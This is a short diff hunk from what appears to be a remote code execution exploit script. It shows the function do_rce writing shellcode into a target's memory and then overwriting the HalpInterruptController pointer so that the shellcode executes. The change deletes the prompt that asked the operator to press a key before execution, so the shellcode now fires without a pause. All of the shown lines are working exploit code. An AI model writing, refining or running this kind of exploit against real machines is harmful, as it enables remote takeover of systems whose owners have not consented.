@@ -429,7 +429,7 @@ def do_rce(ip, port):
     
     print("[+] Wrote shellcode at %lx!" % pshellcodeva)
 
-    input("[+] Press a key to execute shellcode!")
+
     
     write_primitive(ip, port, struct.pack("<Q", pshellcodeva), PHALP_INTERRUPT + HALP_APIC_REQ_INTERRUPT_OFFSET)
     print("[+] overwrote HalpInterruptController pointer, should have execution shortly...")
